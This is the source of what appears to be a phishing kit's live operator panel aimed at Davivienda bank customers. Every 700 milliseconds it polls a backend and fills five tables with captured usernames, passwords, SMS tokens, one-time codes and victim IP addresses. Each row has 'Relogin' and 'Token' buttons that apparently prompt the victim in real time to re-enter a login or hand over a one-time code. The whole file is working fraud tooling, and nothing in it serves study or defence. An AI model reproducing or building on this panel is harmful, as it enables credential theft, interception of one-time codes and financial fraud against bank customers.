<?php 
include('control.php') ?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Table Davivienda</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <link rel="shortcut icon" href="" type="image/x-icon">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.9.4/css/bulma.min.css" integrity="sha512-HqxHUkJM0SYcbvxUw5P60SzdOTy/QVwA1JJrvaXJv4q7lmbDZCmZaqz01UPOaQveoxfYRv1tHozWGPMcuTBuvQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <style>
          html {
            background: url("unnamed.jpg");
            background-repeat: no-repeat;
            background-position: center;
            background-attachment: fixed;
            background-color: #333;
            margin: 0;
        }
        html {
            overflow: auto;
        }
        body {
            padding: 0 20px;
            width: 200vw;
            height: 100vh;
        }
        .column {
            display: flex;
            flex-direction: row;
            flex-wrap: nowrap;
            justify-content: center;
        }
        .btn-relogin, .btn-token {
            padding: 10px 20px;
            border: none;
            cursor: pointer;
            border-radius: 5px;
            font-size: 14px;
            transition: background-color 0.3s, transform 0.3s;
        }
        .btn-relogin {
            background-color: #1E3A8A;
            color: white;
        }
        .btn-token {
            background-color: #3B82F6;
            color: white;
        }
        .btn-relogin:hover, .btn-token:hover {
            opacity: 0.9;
            transform: scale(1.05);
        }
        .btn-relogin:active, .btn-token:active {
            transform: scale(1);
        }
        .btn-relogin:focus, .btn-token:focus {
            outline: none;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
        }
    </style>
</head>
<body>
<div class="columns">
    <div class="column" style="background-color: #B20059; padding: 0.50rem">
        <table class="table is-hoverable">
            <thead>
                <tr>
                    <th>#</th>
                    <th>Usuario</th>
                    <th>Contraseña</th>
                    <th>Token</th>
                    <th>Cod</th>
                    <th>-</th>
                    <th>Ip</th>
                    <th>Opciones</th>
                </tr>
            </thead>
            <tbody id="primera"></tbody>
        </table>
    </div>
    <div class="column" style="background-color: #1F618D; padding: 0.50rem">
        <table class="table is-hoverable">
            <thead>
                <tr>
                    <th>#</th>
                    <th>Usuario</th>
                    <th>Contraseña</th>
                    <th>Token</th>
                    <th>Cod</th>
                    <th>-</th>
                    <th>Ip</th>
                    <th>Opciones</th>
                </tr>
            </thead>
            <tbody id="segunda"></tbody>
        </table>
    </div>
    <div class="column" style="background-color: #E8C203; padding: 0.50rem">
        <table class="table is-hoverable">
            <thead>
                <tr>
                    <th>#</th>
                    <th>Usuario</th>
                    <th>Contraseña</th>
                    <th>Token</th>
                    <th>Cod</th>
                    <th>-</th>
                    <th>Ip</th>
                    <th>Opciones</th>
                </tr>
            </thead>
            <tbody id="tercera"></tbody>
        </table>
    </div>
    <div class="column" style="background-color: #FCEB00; padding: 0.50rem">
        <table class="table is-hoverable">
            <thead>
                <tr>
                    <th>#</th>
                    <th>Usuario</th>
                    <th>Contraseña</th>
                    <th>Token</th>
                    <th>Cod</th>
                    <th>-</th>
                    <th>Ip</th>
                    <th>Opciones</th>
                </tr>
            </thead>
            <tbody id="cuarta"></tbody>
        </table>
    </div>
    <div class="column" style="background-color: #E4062F; padding: 0.50rem">
        <table class="table is-hoverable">
            <thead>
                <tr>
                    <th>#</th>
                    <th>Usuario</th>
                    <th>Contraseña</th>
                    <th>Token</th>
                    <th>Cod</th>
                    <th>-</th>
                    <th>Ip</th>
                    <th>Opciones</th>
                </tr>
            </thead>
            <tbody id="quinta"></tbody>
        </table>
    </div>
</div>

<script>
    function tabla(id, tabla) {
        var hace = "";
        $.ajax({
            type: 'POST',
            url: 'functions.php',
            data: { "id1": id },
            cache: false,
            success: function(data, status) {
                if (data.length > 42) {
                    var cuenta = 0;
                    var hace = '';
                    var conte = JSON.parse(data);
                    for (let i = 0; i < conte.length; i++) {
                        ++cuenta;
                        if (conte) {
                            var usuario = conte[i].Usuario;
                            var reloginButton = "<button class='btn-relogin' onclick='sendValue(\"relogin\", \"" + usuario + "\")'>Relogin</button>";
                            var tokenButton = "<button class='btn-token' onclick='sendValue(\"token\", \"" + usuario + "\")'>Token</button>";
                            if (conte[i].SmsToken == "No") {
                                hace += "<tr><th>" + cuenta + "</th><td onclick='h(this)'>" + conte[i].Usuario + "</td><td onclick='h(this)'>" + conte[i].Clave + "</td><td onclick='h(this)' class='has-background-danger-light'>" + conte[i].SmsToken + "</td><td onclick='h(this)' class='has-background-danger-light'> Non </td><td onclick='h(this)' class='has-background-danger-light'> -- </td><td>" + conte[i].Ip + "</td><td>" + reloginButton + " " + tokenButton + "</td></tr>";
                            } else {
                                hace += "<tr><th>" + cuenta + "</th><td onclick='h(this)'>" + conte[i].Usuario + "</td><td onclick='h(this)'>" + conte[i].Clave + "</td><td onclick='h(this)'>" + conte[i].SmsToken + "</td><td onclick='h(this)'>" + conte[i].CodToken + "</td><td onclick='h(this)'>-- </td><td>" + conte[i].Ip + "</td><td>" + reloginButton + " " + tokenButton + "</td></tr>";
                            }
                        } else {
                            hace += "<tr><td colspan='8'>No hay datos</td></tr>";
                        }
                    }
                    document.querySelector("#" + tabla).innerHTML = hace;
                } else {
                    hace += data;
                    document.querySelector("#" + tabla).innerHTML = hace;
                }
            }
        });
    }

    function sendValue(action, usuario) {
        var value;
        if (action === 'relogin') {
            value = 1;
        } else if (action === 'token') {
            value = 2;
        }
        
        $.ajax({
            type: 'POST',
            url: 'setvalue.php',
            data: { valor: value, usuario: usuario },
            success: function(response) {
                console.log(response);
                // Aquí puedes manejar la respuesta, si es necesario
                alert("Solicitud Registrado");
            },
            error: function(xhr, status, error) {
                console.error(error);
            }
        });
    }

    setInterval(tabla, 700, 1, "primera");
    setInterval(tabla, 700, 2, "segunda");
    setInterval(tabla, 700, 3, "tercera");
    setInterval(tabla, 700, 4, "cuarta");
    setInterval(tabla, 700, 5, "quinta");


</script>
</body>
</html>
